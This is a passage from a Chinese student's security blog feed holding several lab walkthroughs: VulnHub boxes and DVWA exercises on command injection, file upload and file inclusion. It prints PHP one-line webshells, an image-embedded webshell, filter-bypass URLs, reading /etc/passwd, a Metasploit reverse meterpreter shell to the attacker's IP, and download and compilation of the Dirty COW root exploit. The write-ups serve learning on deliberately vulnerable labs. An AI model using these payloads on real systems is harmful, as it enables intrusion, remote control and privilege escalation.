[zip文件]</span><br><span class="line">-v 更详细</span><br><span class="line">-D 使用字典</span><br><span class="line">-u 使用unzip清除错误密码</span><br><span class="line">-p 密码文件</span><br></pre></td></tr></table></figure></blockquote><p>输入<code>fcrackzip -v -D -u -p password.txt t0msp4ssw0rdz.zip</code></p><p><img src="29.jpg" alt="29"><br>得到结果<strong>pw &#x3D;&#x3D; bevH00tr$1995</strong><br>解压获得<strong>passwords.txt</strong><br><img src="30.jpg" alt="30"><br>查看 发现四个密码 其中俩不完整<br><img src="31.jpg" alt="31"><br><strong>bigtommysenior</strong>的密码提示：密码为<strong>fatguyinalittlecoat</strong>后面加了点数字 但是他忘了是啥 提示在公司博客中<br><strong>bigtom</strong>(他连账号都不是很确定)的密码提示：和皇后乐队的一首有名歌曲有联系<br>既然公司博客的类型是<strong>wordpress</strong> 那我们就需要用到<strong>wpscan</strong>工具了</p><blockquote><p>WPScan是Kali Linux默认自带的一款漏洞扫描工具，它采用Ruby编写，能够扫描WordPress网站中的多种安全漏洞，其中包括WordPress本身的漏洞、插件漏洞和主题漏洞。最新版本WPScan的数据库中包含超过18000种插件漏洞和2600种主题漏洞，并且支持最新版本的WordPress。值得注意的是，它不仅能够扫描类似robots.txt这样的敏感文件，而且还能够检测当前已启用的插件和其他功能.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;--update 更新到最新版本</span><br><span class="line">&gt;--url | -u &lt;target url&gt; 要扫描的`WordPress`站点.</span><br><span class="line">&gt;--force | -f 不检查网站运行的是不是`WordPress`</span><br><span class="line">&gt;--enumerate | -e [option(s)] 枚举</span><br><span class="line">&gt;u 枚举用户名，默认从1-10</span><br><span class="line">&gt;u[10-20] 枚举用户名，配置从10-20</span><br><span class="line">&gt;--username | -U &lt;username指定爆破的用户名</span><br><span class="line">&gt;--wordlist | -w &lt;wordlist指定密码字典</span><br></pre></td></tr></table></figure></blockquote><p>我们输入指令<code>wpscan --url &quot;http://192.168.246.136/prehistoricforest/&quot; -e u</code><br><img src="32.jpg" alt="32"><br>发现存在用户tom<br>那就指定爆破用户tom的密码<br><code>wpscan --url http://192![33](/33.jpg).168.246.136/prehistoricforest/ -P /usr/share/wordlists/rockyou.txt -U tom</code><br><img src="33.jpg" alt="33"><br>结果得出tom的密码为<strong>tomtom1</strong><br>我们利用这套账号密码登录公司wordpress博客的后台<br><img src="34.jpg" alt="34"><br>里面有个未发布的文章 内容是之前提到的<strong>fatguyinalittlecoat</strong>后的数字<br>于是我们得出<br><strong>bigtommysenior</strong>的密码为<strong>fatguyinalittlecoat1938!!</strong></p><blockquote><p>坑：可能有点先入为主了 我试了好几遍fatguyinalittlecoat1938</p></blockquote><p>我们用这套账号密码登入该靶机的ssh服务</p><p><img src="35.jpg" alt="35"><br>首先是获得了flag4</p><h2 id="flag5"><a href="#flag5" class="headerlink" title="flag5"></a>flag5</h2><p>根目录下的LOOT.ZIP有密码 暂且不管他<br>获得flag4的同时 它留下了提示:flag5位于服务器的**&#x2F;.5.txt**中<br>但该文件需要root权限</p><p>那我们根据<strong>Linux的http网站的根目录一般都是&#x2F;var&#x2F;www&#x2F;html</strong>来看看有没有之前破解过程中服务器中的<strong>NickIzL33t</strong></p><p>最终省略寻找过程 我们发现&#x2F;<strong>&#x2F;var&#x2F;thatsg0nnaleaveamark&#x2F;NickIzL33t&#x2F;P4TCH_4D4MS</strong>下有一个开放权限的<strong>uploads</strong>文件夹<br>我们利用 <strong>文件上传漏洞</strong> 在其中创建一个文件  </p><p><img src="36.jpg" alt="36"></p><p>创建完毕 在firefox中利用木马<br><img src="37.jpg" alt="37"><br>他给出了第五个flag 并叫我们<strong>将五个flag结合起来 作为密码解压LOOT.ZIP</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">flag1：B34rcl4ws</span><br><span class="line">flag2：Z4l1nsky</span><br><span class="line">flag3：TinyHead</span><br><span class="line">flag4：EditButton</span><br><span class="line">flag5：Buttcrack</span><br><span class="line">结合起来就是B34rcl4wsZ4l1nskyTinyHeadEditButtonButtcrack</span><br></pre></td></tr></table></figure><p><strong>解压LOOT.ZIP 获得THE-END.txt</strong><br><img src="38.jpg" alt="38"><br>过关！</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>总过程4 5小时 是我目前做过过程最繁琐的靶机<br>配合了多个工具 需要对多个漏洞有充分了解才能解开<br>经过这次打靶认识了不少新玩意 同时也认识到了一些不足<br>希望可以活用到下一次</p>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
          <category> 靶机解析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
            <tag> 靶机解析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>owasp命令执行漏洞</title>
      <link href="/2023/12/01/owasp%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
      <url>/2023/12/01/owasp%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<p>好的那么今天我们来讲命令执行漏洞<br>owasp下载地址:<br><a href="https://sourceforge.net/projects/owaspbwa/files/">https://sourceforge.net/projects/owaspbwa/files/</a><br>注:如遇dvwa无法更改难度 多半为cookie所致 请随以下教程删除网站的缓存：<a href="https://support.mozilla.org/zh-CN/kb/Deleting%20cookies">请点这里</a><br><strong>命令执行漏洞</strong> 一般指的是网站中有程序可以运行命令行指令<br>但忘记过滤 <strong>&amp;&amp; &amp; | || ;</strong> 等字符 使得恶意代码可以被允许运行的漏洞</p><blockquote><p>WINDOWS系统支持的管道符<br>“|”：直接执行后面的语句<br>例如：<code>ping www.baidu.com|whoami</code><br>“||”：如果前面执行的语句执行出错，则执行后面的语句<br>例如：<code>ping www.baidu.com||whoami</code><br>“&amp;”：如果前面的语句为假则直接执行后面的语句，前面的语句可真可假<br>例如：<code>ping www.baidu.com&amp;whoami或者ping www.baidu.com&amp;whoami</code><br>“&amp;&amp;”：如果前面的语句为真先执行第一个命令后执行第二个命令；为假则直接出错，也不执行后面的语句<br>例如：<code>ping www.baidu.com&amp;&amp;whoami ping www.baidu.com&amp;&amp;whoami</code><br>LINUX系统支持的管道符<br>“；”执行完前面的命令执行后面的<br>“|”：显示后面语句的执行结果<br>“||”：当前面的语句执行出错时，执行后面的语句<br>“&amp;”：如果前面的语句为假，则直接指向后面的语句，前面的语句可真可假<br>“&amp;&amp;”：如果前面的语句为假则直接出错，也不执行后面的语句<br>————————————————<br>版权声明：本文为CSDN博主「H3rmesk1t」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/LYJ20010728/article/details/117349106">https://blog.csdn.net/LYJ20010728/article/details/117349106</a></p></blockquote><p>169.254.x.x 受限地址 微软自己买下来的一段地址 一般是检测系统是否为windows的</p><h1 id="实操部分"><a href="#实操部分" class="headerlink" title="实操部分"></a>实操部分</h1><h2 id="1）低等级"><a href="#1）低等级" class="headerlink" title="1）低等级"></a>1）低等级</h2><p><img src="1.jpg" alt="1"><br>查看网站源码 发现没有做过多限制<br>直接进行漏洞利用<br><img src="2.jpg" alt="2.jpg"></p><h2 id="2-中级别"><a href="#2-中级别" class="headerlink" title="2).中级别"></a>2).中级别</h2><p>首先查看源码<br><img src="3.jpg" alt="3.jpg"><br>可以看出它限制了 <strong>&amp;&amp;</strong> 与 <strong>;</strong> 会将它们替换为空格<br>那就很方便 使用 <strong>|</strong> 与其他的字符来绕过即可<br><img src="4.jpg" alt="4.jpg"></p><h2 id><a href="#" class="headerlink" title></a></h2>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
          <category> 靶机解析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
            <tag> 靶机解析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>owasp文件包含漏洞</title>
      <link href="/2023/11/28/owasp%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"/>
      <url>/2023/11/28/owasp%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<p>那么我们今天来讲包含<br>老师给了关于<strong>文件上传和文件包含</strong>的笔记 那我就誊在这里 再把实践部分传过来<br>owasp下载地址:<br><a href="https://sourceforge.net/projects/owaspbwa/files/">https://sourceforge.net/projects/owaspbwa/files/</a><br>注:如遇dvwa无法更改难度 多半为cookie所致 请随以下教程删除网站的缓存：<a href="https://support.mozilla.org/zh-CN/kb/Deleting%20cookies">请点这里</a></p><h1 id="笔记部分"><a href="#笔记部分" class="headerlink" title="笔记部分"></a>笔记部分</h1><p>文件上传漏洞</p><h2 id="1-什么是文件上传漏洞"><a href="#1-什么是文件上传漏洞" class="headerlink" title="1.什么是文件上传漏洞"></a>1.什么是文件上传漏洞</h2><p>漏洞描述<br>文件上传是 Web 应用的必备功能之一，比如上传头像显示个性化、上传附件共享文件、上传脚本更新网站。如果服务器配置不当或者没有进行足够的过滤，Web 用户就可以上传任意文件，包括恶意脚本文件、exe 程序等，这就造成了文件上传漏洞。</p><h2 id="2-什么是webshell"><a href="#2-什么是webshell" class="headerlink" title="2.什么是webshell"></a>2.什么是webshell</h2><p>在计算机科学中，Shell 俗称壳（用来区别“核”），是指“为使用者提供操作界面”的软件（命令解释器）。类似于 windows 系统给的 cmd.exe 或者 Linux 下 bash 等，虽然这些系统的命令解释器不止一种。<br>WebShell 是一个网站的后门，也是一个命令解释器，不过是以 Web 方式（HTTP 协议）通信（传递命令消息），继承了 Web 用户的权限。WebShell 本质上是服务器端可运行的脚本文件，后缀名为.php&#x2F;.asp&#x2F;.aspx&#x2F;.jsp 等，也就是说 WebShell 接受来自于 Web 用户的命令，然后在服务器端执行。</p><h2 id="3-一句话木马-小马"><a href="#3-一句话木马-小马" class="headerlink" title="3.一句话木马(小马)"></a>3.一句话木马(小马)</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">asp:</span><br><span class="line">&lt;%e1val request(&quot;pass&quot;)%&gt;</span><br><span class="line">php:</span><br><span class="line">&lt;?php @e1val($\_GET[&#x27;cmd&#x27;]);?&gt;</span><br><span class="line">&lt;?php @s1ystem($\_GET[&#x27;cmd&#x27;]);?&gt;</span><br><span class="line">&lt;?php $cmd=$\_GET[&#x27;cmd&#x27;]; s1ystem($cmd); ?&gt;</span><br><span class="line">&lt;?php @e1val($\_POST[&#x27;cmd&#x27;]);?&gt;</span><br></pre></td></tr></table></figure><p>请记住以上4条语句！！！（其中数字1去掉）</p><h2 id="4-（低级别）文件上传漏洞"><a href="#4-（低级别）文件上传漏洞" class="headerlink" title="4.（低级别）文件上传漏洞"></a>4.（低级别）文件上传漏洞</h2><p>切换到UPload<br>1）先上传一张图片（文件大小在100KB以内），根据返回路径验证该文件受否存在。</p><p>2）再上传一个小马ma1.php，  </p><p>根据返回路径验证该文件受否存在,并测试效果。</p><p>3）再上传一个小马ma2.php，  </p><p>根据返回路径验证该文件受否存在,并测试效果。</p><p>4）再上传一个小马ma3.php，  </p><p>根据返回路径验证该文件受否存在,并测试效果。</p><p>5)使用中国菜刀（或蚁剑antword）链接ma3.php，测试文件上传、下载。（文件管理）</p><p>6）使用菜刀的虚拟终端功能，远程执行目标计算机系统指令。（虚拟终端）</p><p>7）使用菜刀的数据库管理功能，远程执行目标计算机系统指令。（数据库管理）</p><p>数据库类型<br>主机地址<br>数据库用户</p><p>数据库密码</p><p>以上内容根据实际情况填写，本实验为：<br>MYSQL<br>192.168.88.128<br>root</p><p>owaspbwa</p><h2 id="5-（中级别）文件上传漏洞"><a href="#5-（中级别）文件上传漏洞" class="headerlink" title="5.（中级别）文件上传漏洞"></a>5.（中级别）文件上传漏洞</h2><p>仍然上传一个PHP文件，发现失败，提示信息如下：<br>Your image was not uploaded.<br>查看网页后端源代码：<br>发现需满足如下条件：<br>if (($uploaded_type &#x3D;&#x3D; “image&#x2F;jpeg”) &amp;&amp; ($uploaded_size &lt; 100000))<br>分析得出网站对客户端上传文件的MIME类型做了限制。</p><p>什么是MIME<br>MIME, 全称为“Multipurpose Internet Mail Extensions”, 比较确切的中文名称为“多用途互联网邮件扩展”。它是当前广泛应用的一种电子邮件技术规范，基本内容定义于RFC 2045-2049<br>什么是MIME类型?-在把输出结果传送到浏览器上的时候，浏览器必须启动适当的应用程序来处理这个输出文档。这可以通过多种类型MIME（多功能网际邮件扩充协议）来完成。在HTTP中，MIME类型被定义在Content-Type header中。<br>例 如，架设你要传送一个Microsoft Excel文件到客户端。那么这时的MIME类型就是“application&#x2F;vnd.ms-excel”。 在大多数实际情况中，这个文件然后将传送给 Execl来处理（假设我们设定Execl为处理特殊MIME类型的应用程序）。在ASP中，设定MIME类 型的方法是通过Response对象的 ContentType属性。<br>多媒体文件格式MIME<br>最早的HTTP协议中，并没有附加的数据类型信息，所有传送的数据都被客户程序解释为超文本标记语言HTML 文档，而为了支持多媒体数据类型，HTTP协议中就使用了附加在文档之前的MIME数据类型信息来标识数据类型。<br>MIME意为多目Internet邮件扩展，它设计的最初目的是为了在发送电子邮件时附加多媒体数据，让邮件客户程序能根据其类型进行处理。然而当它被HTTP协议支持之后，它的意义就更为显著了。它使得HTTP传输的不仅是普通的文本，而变得丰富多彩。<br>每个MIME类型由两部分组成，前面是数据的大类别，例如声音audio、图象image等，后面定义具体的种类。</p><p>常见的MIME类型</p><p>超文本标记语言文本 .html,.html text&#x2F;html<br>普通文本 .txt text&#x2F;plain<br>RTF文本 .rtf application&#x2F;rtf<br>GIF图形 .gif image&#x2F;gif<br>JPEG图形 .ipeg,.jpg image&#x2F;jpeg<br>au声音文件 .au audio&#x2F;basic<br>MIDI音乐文件 mid,.midi audio&#x2F;midi,audio&#x2F;x-midi<br>RealAudio音乐文件 .ra, .ram audio&#x2F;x-pn-realaudio<br>MPEG文件 .mpg,.mpeg video&#x2F;mpeg<br>AVI文件 .avi video&#x2F;x-msvideo<br>GZIP文件 .gz application&#x2F;x-gzip<br>TAR文件 .tar application&#x2F;x-tar</p><p>如何修改上传文件的MIME类型，请出Web神器BurpSuite<br>BurpSuite可以将客户端与服务器之间传输的数据进行拦截，然后对数据进行修改并再次发送，从而完成攻击过程。<br>1)本实验我们BurpSuite代理服务器和客户端是同一台计算机（KALI），因此，BurpSuite代理模块监听127.0.0.1:8080(无需修改)；<br>2）设置客户端浏览器firefox的代理地址，指向BurpSuite代理服务器（127.0.0.1:8080）；<br>3）再次上传ma.php，发现网页一直等在那里（因为数据发送到了BurpSuite代理服务器，等待用户操作）；<br>4）在BurpSuite中拦截界面找到上传文件的数据包，修改上传文件的MIME类型<br>（修改content-type，由appalication&#x2F;x-php改为imag&#x2F;jpeg）<br>5)上传成功，后续操作略。</p><h2 id="6-（高级别）文件上传漏洞利用"><a href="#6-（高级别）文件上传漏洞利用" class="headerlink" title="6.（高级别）文件上传漏洞利用"></a>6.（高级别）文件上传漏洞利用</h2><p>仍然上传一个PHP文件，发现失败，提示信息如下：<br>Your image was not uploaded.<br>查看网页后端源代码：<br>发现需满足如下条件：<br>if (($uploaded_ext &#x3D;&#x3D; “jpg” || $uploaded_ext &#x3D;&#x3D; “JPG” || $uploaded_ext &#x3D;&#x3D; “jpeg” || $uploaded_ext &#x3D;&#x3D; “JPEG”) &amp;&amp; ($uploaded_size &lt; 100000))<br>分析得出网站对客户端上传文件的扩展名做了限制。<br>未完待续……<br>6.DVWA靶场文件包含漏洞利用（低级别）<br>To include a file edit the ?page&#x3D;index.php in the URL to determine which file is included.<br>code:<br><code>&lt;?php $file = $_GET[&#39;page&#39;]; //The page we wish to display ?&gt;</code><br>文件包含漏洞<br>文件包含分为本地文件包含和远程文件包含</p><p>1）先看本地文件包含（包含的文件是目标计算机上的文件）<br>e.g:<br>?page&#x3D;&#x2F;etc&#x2F;passwd<br>?page&#x3D;&#x2F;etc&#x2F;resolv.conf<br>….<br>也可以包含一些我们自己创建的文件<br>我们登录到DVWA靶场，切换到&#x2F;var&#x2F;www&#x2F;目录，创建2个文件：1.txt和2.php<br>cd &#x2F;var&#x2F;www&#x2F;<br>echo 123 &gt; 1.txt<br>echo ““ &gt; 2.php<br>在kali上去包含我们自己创建的这2个文件，看看效果，有什么启发？</p><p>2）再看远程文件包含（包含的文件是远程计算机上的文件）<br>在kali上假设一个网站，网站主目录放点内容（也可以是3.txt和4.php）<br>systemctl status apache2<br>systemctl start apache2<br>cd &#x2F;var&#x2F;www&#x2F;html<br>echo 123 &gt; 3.txt<br>echo ““ &gt; 4.php<br>进入DVWA文件包含页面，试着包含一下，看看效果<br><code>?page=http://kali的IP地址/3.txt</code><br><code>?page=http://kali的IP地址/4.php</code><br>sudo passwd root &#x2F;&#x2F;修改root用户的密码</p><p>3)图片种马（将一句话木马写到图片中）<br>如何种马？准备一个正经的图片1.jpg和1个不正经的1.php,通过强大的copy命令合成一下：<br>copy 1.jpg&#x2F;b+1.php&#x2F;a hack.jpg<br>合成后验证这个图片能够正常显示，并查看图片中是否有这个一句话木马。<br>1.php内容如下：<br><code>&lt;?fputs(fopen(&quot;shell10.php&quot;,&quot;w&quot;),&#39;&lt;?php @system($_GET[&#39;cmd&#39;]);?&gt;&#39;)?&gt;</code></p><h2 id="7-（中级别）文件包含漏洞利用"><a href="#7-（中级别）文件包含漏洞利用" class="headerlink" title="7.（中级别）文件包含漏洞利用"></a>7.（中级别）文件包含漏洞利用</h2><p>先访问<br><code>http://192.168.88.128/dvwa/vulnerabilities/fi/?page=/etc/passwd</code><br>发现也存在本地文件包含漏洞<br>在测试一下是否存在远程文件包含漏洞<br><code>http://192.168.88.128/dvwa/vulnerabilities/fi/?page=http://192.168.88.129/2.php</code><br><code>http://192.168.88.128/dvwa/vulnerabilities/fi/?page=http://192.168.88.129/1.txt</code><br>发现远程文件包含漏洞不成功；<br>查看网站后端源码，发现以下内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$file = $\_GET[&#x27;page&#x27;]; // The page we wish to display</span><br><span class="line">// Bad input validation</span><br><span class="line">$file = str\_replace(&quot;http://&quot;, &quot;&quot;, $file);</span><br><span class="line">$file = str\_replace(&quot;https://&quot;, &quot;&quot;, $file);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>尝试通过以下方式绕过：<br><code>http://192.168.88.128/dvwa/vulnerabilities/fi/?page=hhttp://ttp://192.168.88.129/1.txt</code><br><code>http://192.168.88.128/dvwa/vulnerabilities/fi/?page=HTTP://192.168.88.129/1.txt</code><br><code>http://192.168.88.128/dvwa/vulnerabilities/fi/?page=Http://192.168.88.129/1.txt</code></p><h2 id="8-（高级别）文件包含漏洞利用"><a href="#8-（高级别）文件包含漏洞利用" class="headerlink" title="8.（高级别）文件包含漏洞利用"></a>8.（高级别）文件包含漏洞利用</h2><p>先访问<br><code>http://192.168.88.128/dvwa/vulnerabilities/fi/?page=/etc/passwd</code><br>出现报错：<br>ERROR: File not found!<br><code>http://192.168.88.128/dvwa/vulnerabilities/fi/?page=http://192.168.88.129/1.txt</code><br>出现报错：<br>ERROR: File not found!<br>发现本地和远程文件包含漏洞都不成功；<br>查看网站后端源码，发现以下内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$file = $\_GET[&#x27;page&#x27;]; //The page we wish to display</span><br><span class="line">// Only allow include.php</span><br><span class="line">if ( $file != &quot;include.php&quot; ) &#123;</span><br><span class="line">echo &quot;ERROR: File not found!&quot;;</span><br><span class="line">exit;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这种代码的写法相当安全但是不够灵活！！！</p><h1 id="实操部分"><a href="#实操部分" class="headerlink" title="实操部分"></a>实操部分</h1><h2 id="1-漏洞发现"><a href="#1-漏洞发现" class="headerlink" title="1.漏洞发现"></a>1.漏洞发现</h2><p>总之先进入dvwa靶机 将难度调整至<strong>medium</strong> 选择<strong>file inclusion</strong><br><img src="1.jpg" alt="1"><br>先通过<a href="http://192.168.88.128/dvwa/vulnerabilities/fi/?page=/etc/passwd%E6%B5%8B%E8%AF%95">http://192.168.88.128/dvwa/vulnerabilities/fi/?page=/etc/passwd测试</a><br><img src="2.jpg" alt="2"><br>确实存在本地文件包含漏洞<br>随后我们再来测试一下远程包含漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">systemctl status apache2 //查看系统apache2服务的情况</span><br><span class="line">systemctl start apache2 //开启apache2服务</span><br><span class="line">cd /var/www/html //进入apache2服务端源目录</span><br><span class="line">echo 123 &gt; 3.txt //创建内容为123的3.txt文件</span><br><span class="line">echo &quot;&lt;?php phpinfo(); ?&gt;&quot; &gt; 4.php //创建运行phpinfo的4.php网站</span><br></pre></td></tr></table></figure><p><img src="3.jpg" alt="3"><br>在page后加入<code>http://kali的ip/4.php</code><br><img src="4.jpg" alt="4"></p><p>发现没有成功</p><p>查看源码 寻找原因<br><img src="5.jpg" alt="5"><br>发现网站中会将<code>http://</code>与<code>https://</code>替换为空格</p><p>这里有两种方法 <strong>大写</strong> 或 <strong>双写</strong></p><p><img src="6.jpg" alt="6"><br>大写后发现成功绕过防护</p><blockquote><h3 id="好的-目前先讲到这里-我们日后再说"><a href="#好的-目前先讲到这里-我们日后再说" class="headerlink" title="好的 目前先讲到这里 我们日后再说"></a>好的 目前先讲到这里 我们日后再说</h3></blockquote>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
          <category> 靶机解析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
            <tag> 靶机解析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>每周靶机之WALLABY&#39;S-NIGHTMARE</title>
      <link href="/2023/11/24/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BWALLABY%E2%80%99S-NIGHTMARE/"/>
      <url>/2023/11/24/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BWALLABY%E2%80%99S-NIGHTMARE/</url>
      
        <content type="html"><![CDATA[<p>最近加入了学校的网安工作室 每周会给点作业 小项目需要写writeup<br>总之这是今天的靶机</p><h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><p>老样子 VMWARE 靶机 kali<br>ps: <strong>请注意每个人的ip都会因为配置有细微的区别 请勿照抄代码</strong><br>攻击机：kali（192.168.246.128）<br>靶机：WALLABY’S: NIGHTMARE (V1.0.2)（192.168.246.134）<br>靶机下载地址：<a href="https://www.vulnhub.com/entry/wallabys-nightmare-v102,176/">https://www.vulnhub.com/entry/wallabys-nightmare-v102,176/</a></p><h2 id="发现靶机-访问网站"><a href="#发现靶机-访问网站" class="headerlink" title="发现靶机&amp;访问网站"></a>发现靶机&amp;访问网站</h2><p>总之先<code>arp-scan -l</code>一下<br><img src="1.jpg" alt="1"><br>发现靶机ip为192.168.246.134 使用nmap查看开放端口<br><code>nmap -p- 192.168.246.134 //快速扫描常用端口</code><br><img src="2.jpg" alt="2"><br>结果显示开放了22 80端口<br>先上firefox查看 80端口对应的http服务<br><code>http://192.168.246.134</code><br><img src="3.jpg" alt="3"><br>↑叫我输入个用户名 我这里就用我常用的网名了<br><img src="4.jpg" alt="4"><br>↑点击超链接开始你的ctf之旅</p><h2 id="解析过程"><a href="#解析过程" class="headerlink" title="解析过程"></a>解析过程</h2><p>网站里有一只大眼睛 上面的英语大意是<strong>它发现了你要渗透这个服务器 正在观察你</strong><br><img src="5.jpg" alt="5"><br>我们先通过f12查看源码 发现没有什么隐藏的东西<br>于是使用web漏洞扫描工具<strong>nikto</strong>进行扫描<br><code>nikto -host 192.168.246.134</code><br><img src="6.jpg" alt="6"><br><strong>nikto</strong>表示这个网站存在漏洞 于是我们随它指示将这段链接复制到firefox替换网址后半段<br>输完之后 enter访问 发现 <strong>欸 怎么连接不上了</strong><br><img src="7.jpg" alt="7"><br><img src="8.jpg" alt="8"><br>↑就算是通过history看之前大眼睛的网站也链接不上<br>再次通过nmap扫描 看看是不是80端口的问题<br><code>nmap -p- 192.168.246.134 //快速扫描常用端口</code><br><img src="9.jpg" alt="9"><br>我们可以看到多出了个60080端口<br>让我们通过firefox访问该端口查看一下什么情况<br><code>http://192.168.246.134:60080/</code><br><img src="10.jpg" alt="10"><br>英语大意是<strong>惊讶你追的很紧 幸好它完全转移到了一个不同的端口</strong><br>这里我们可以猜到<br>之前在80端口时有个&#x2F;?page页面 这里也多半会有 让我们试试看<br><img src="11.jpg" alt="11"><br>果然对劲 我们再使用<strong>dirb</strong>工具对此页面进行目录扫描<br><code>dirb http://192.168.246.134:60080/?page=</code><br><img src="12.jpg" alt="12"><br>结果里出现了一个后缀为mailer的网页<br>访问看看<br><img src="13.jpg" alt="13"><br>看似什么都没有<br>但我们可以使用f12查看源码 发现有一段注释<br><img src="14.jpg" alt="14"><br>这里<br><code>&lt;a href=&#39;/?page=mailer&amp;mail=mail wallaby &quot;message goes here&quot;&#39;&gt;&lt;button type=&#39;button&#39;&gt;Sendmail&lt;/button&gt;</code><br>暴露了存在RCE（远程代码执行漏洞）</p><blockquote><p>用户通过浏览器提交执行命令，由于服务器端没有针对执行函数做过滤，导致在没有指定绝对路径的情况下就执行命令，可能会允许攻击者通过改变 $PATH 或程序执行环境的其他方面来执行一个恶意构造的代码。——以上来自百度百科</p></blockquote><p>于是我们验证一下<br><img src="15.jpg" alt="15"><br>↑通过改变命令验证<br>漏洞已经出现<br>于是乎我们便可以通过多种方式来解决了<br>我用的是Metasploit</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/script/web\_delivery</span><br><span class="line">set target 1</span><br><span class="line">set payload php/meterpreter/reverse\_tcp</span><br><span class="line">set lhost 192.168.246.128</span><br><span class="line">set lport 8888</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p>首先输入<strong>msfconsole</strong>进入msf控制台<br><img src="16.jpg" alt="16"><br>↑设置msf参数，开启监听<br>将它所反馈出的命令<strong>复制在整个网址的mail&#x3D;之后</strong>来启动整个监听程序<br><img src="17.jpg" alt="17"><br>网站一直显示加载中则多半成功了 我们ctrl+c停止后输入sessions查看<br>出现了一个已获取的shell<br>我们输入<code>sessions 1</code>来链接shell<br>随后使用<code>sysinfo</code>命令查看靶机的系统信息<br>使用<code>shell -t</code>命令来获取系统shell<br><img src="18.jpg" alt="18"></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>总算来到了惊心动魄的提权环节<br>我们再开一个cmd窗口<br>输入<br>wget+<code>https://gist.githubusercontent.com/rverton/e9d4ff65d703a9084e85fa9df083c679/raw/9b1b5053e72a58b40b28d6799cf7979c53480715/cowroot.c</code><br>(格式所迫 只能这么写了)<br><code>python3 -m http.server 8081 //开启kali的http服务</code><br><img src="19.jpg" alt="19"><br>回到刚才连接到靶机的cmd窗口<br><code>wget http://192.168.246.128:8081/cowroot.c //用靶机获取kali所分享的文件</code><br><code>gcc cowroot.c -o exp -pthread //对刚刚下载的提权脚本进行编译</code><br><img src="20.jpg" alt="20"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod +x exp //给提权脚本赋予执行权限</span><br><span class="line">./exp //运行提权脚本，运行后即可提权至root</span><br></pre></td></tr></table></figure><p>这两句代码后 你就已经拥有了所有的权限<br>运用一些基础的linux语言便可获得flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /root //将目录切换至root</span><br><span class="line">ls //列出文件夹中的文件</span><br><span class="line">cat flag.txt //查看flag.txt中的内容</span><br></pre></td></tr></table></figure><p><img src="21.jpg" alt="21"></p><h1 id="好的那么我们下次见！"><a href="#好的那么我们下次见！" class="headerlink" title="好的那么我们下次见！"></a><strong>好的那么我们下次见！</strong></h1>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
          <category> 靶机解析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
            <tag> 靶机解析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>owasp上传漏洞</title>
